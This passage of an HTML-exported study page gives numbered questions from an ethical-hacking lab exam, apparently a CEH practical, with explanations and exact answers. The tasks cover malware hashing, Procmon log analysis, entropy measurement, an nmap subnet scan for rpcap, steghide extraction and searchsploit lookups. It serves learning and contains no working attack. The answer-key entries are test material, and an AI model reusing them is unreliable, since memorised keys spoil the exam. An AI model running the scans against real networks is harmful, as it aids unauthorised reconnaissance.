id="2813addf-00cb-80df-b4d7-e178bc82eb97" class="">
+</p></div></p><ol type="1" id="2803addf-00cb-80fa-8355-d24766b1e468" class="numbered-list" start="10"><li>You are assigned to perform malware scanning on a malware file Tools.rar stored in Downloads folder of EH workstation-2 machine and determine the last four digits of the file’s SHA-256 hash value. (Format: aNNN)</li></ol><p id="2803addf-00cb-8021-b224-fca7ad60757f" class="">Explanation: <div class="indented"><p id="2803addf-00cb-8027-b7ec-f92631ef00c8" class="">Change directory into Downloads folder</p><p id="2803addf-00cb-803f-9f2a-e36ca0a2a431" class=""><em><strong>sha256sum Tools.rar</strong></em></p></div></p><p id="2803addf-00cb-8076-bdd2-ee8e4780cd3a" class="">Answer: <div class="indented"><p id="2803addf-00cb-80a6-86f5-fc106c705d3f" class="">d282</p></div></p><p id="2803addf-00cb-80c9-b60e-cc3d3ac7dc76" class="">
+</p><ol type="1" id="2803addf-00cb-803b-9097-df2c398fd65d" class="numbered-list" start="11"><li>You are assigned to monitor a suspicious process running in a machine whose log file Logfile.PML is saved in Pictures folder of the EH Workstation -2. Analyse the logfile and determine the Parent PID of the malicious file H3ll0.exe process from the log file. (Format: NNNN)</li></ol><p id="2803addf-00cb-8034-9cfb-e49ded2e54ea" class="">Explanation: <div class="indented"><p id="2803addf-00cb-80a9-942a-edd4d032717a" class="">Copy/Paste file to Windows machine CEH folder: Places&gt;Network&gt;smb://&lt;windows IP address&gt; (May have to change username to admin) </p><p id="2803addf-00cb-805c-94c4-ff318212ed8a" class="">Install Procmon (Located in E:\Dynamic Malware Analysis Tool\Process Monitoring Tools</p><p id="2803addf-00cb-808f-b121-e7a4c4380f39" class="">Filter to H3ll0 &gt; Double click proces name &gt; See PID</p></div></p><p id="2803addf-00cb-80bf-837d-d9f4414650ca" class="">Answer: <div class="indented"><p id="2803addf-00cb-807d-89b2-db2ff87548ee" class="">6952</p></div></p><p id="2803addf-00cb-80e3-bf94-c9db44a448c8" class="">
+</p><ol type="1" id="2803addf-00cb-802e-b494-e47a1c329d0d" class="numbered-list" start="12"><li>You are tasked with analyzing the ELF executable file named Tornado.elf, located in the Downloads folder of EH Workstation-2. Determine the entropy value of the file up to two decimal places. (Format: N*NN)</li></ol><p id="2803addf-00cb-8064-bc60-f29637cbb8cd" class="">Explanation: <div class="indented"><p id="2803addf-00cb-8095-af0f-d3bbe563b1ef" class="">Copy/Paste file to Windows machine CEH folder: Places&gt;Network&gt;smb://&lt;windows IP address&gt; (May have to change username to admin) </p><p id="2803addf-00cb-80ff-a716-e584525c12a8" class="">Run DIE.exe (Located in Static Malware Analysis&gt;Packaging and Obfuscation Tools)</p><p id="2803addf-00cb-80da-9823-dd34a7d6ddab" class="">Upload file via elipses icon</p><p id="2803addf-00cb-8071-91b9-ec095e599107" class="">Click entropy</p></div></p><p id="2803addf-00cb-8041-a9e8-c38a590c83b2" class="">Answer: <div class="indented"><p id="2803addf-00cb-806b-9845-e04193384ae8" class="">2.87</p></div></p><p id="2803addf-00cb-80a4-9893-f91f3b219d43" class="">
+</p><ol type="1" id="2803addf-00cb-804f-b910-f207422cc957" class="numbered-list" start="13"><li>You are assigned to scan the target subnets to identify the remote packet capture feature that is enabled to analyse the traffic on the target machine remotetly. Scan the target subnets and determine the IP address using rpcap service. (Format: NNN.NNN.NN.NNN)</li></ol><p id="2803addf-00cb-8006-a6f1-c4785131434f" class="">Explanation: <div class="indented"><p id="2803addf-00cb-80fd-adc7-fce4eca8aa74" class="">Default port for the rpcap service is 2002</p><p id="2803addf-00cb-800a-9b93-f70c035d715a" class=""><em><strong>nmap -p 2002 192.168.10.* </strong></em></p><p id="2803addf-00cb-80f7-96ed-f76366abc573" class="">Note: Attempted <em><strong>nmap --script=sniffer-detect [Target IP Address/ IP Address Range] </strong></em>to detect hosts in promiscuous mode, but this did not work</p></div></p><p id="2803addf-00cb-80c0-8bbe-c815d337e6ad" class="">Answer: <div class="indented"><p id="2803addf-00cb-80a5-be53-c76cbdddde6b" class="">192.168.10.144</p></div></p><p id="2803addf-00cb-80c1-a91b-e729c0af3670" class="">
+</p><ol type="1" id="2803addf-00cb-8042-91e8-e4fa1f7f90d1" class="numbered-list" start="14"><li>An insider attack occurred in an organization and the confidential data regarding an upcoming event is sniffed and encrypted in a image file stealth.jpeg stored in Desktop of EH Workstation -2 machine. You are assigned to extract the hidden data inside the cover file using steghide tool and determine the tender quotation value. (Use azerty@123 for passphrase) (Format: NNNNNNN)</li></ol><p id="2803addf-00cb-8089-8e13-dbe4b2e69dca" class="">Explanation: <div class="indented"><p id="2803addf-00cb-8011-9e86-d3ec4cb76018" class="">Use steghide command line tool: <em><strong>steghide --extract -sf stealth.jpeg</strong></em></p><p id="2803addf-00cb-8039-b887-d8c8ab9cf5f4" class="">Can add <em><strong>-v </strong></em>for verbose output</p><p id="2803addf-00cb-80e4-b10d-e2b6ec95ab55" class="">Enter passphrase</p><p id="2803addf-00cb-80c7-8df6-fce02a47d996" class="">View extracted data in text file created</p></div></p><p id="2803addf-00cb-803b-be48-cfe965def6d1" class="">Answer: <div class="indented"><p id="2803addf-00cb-808a-87a2-eafc5995298f" class="">3965222</p></div></p><p id="2803addf-00cb-801e-81e7-df71928f250d" class="">
+</p><ol type="1" id="2803addf-00cb-80b4-8c68-fa0c3d0616c1" class="numbered-list" start="15"><li>Perform vulnerability search using searchsploit tool and determine the path of AirDrop 2.0 vulnerability. (Format: aaaaaaa/aaa/NNNNN.a)</li></ol><p id="2803addf-00cb-80ee-8ca6-f3978862ce22" class="">Explanation: <div class="indented"><p id="2803addf-00cb-80d4-94d6-c262b5f7b417" class=""><em><strong>searchsploit -t Airdrop 2.0</strong></em></p><p id="2803addf-00cb-80f6-aae5-d7dfa92e30d9" class="">See path </p></div></p><p id="2813addf-00cb-807d-8969-e9fc10681069" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
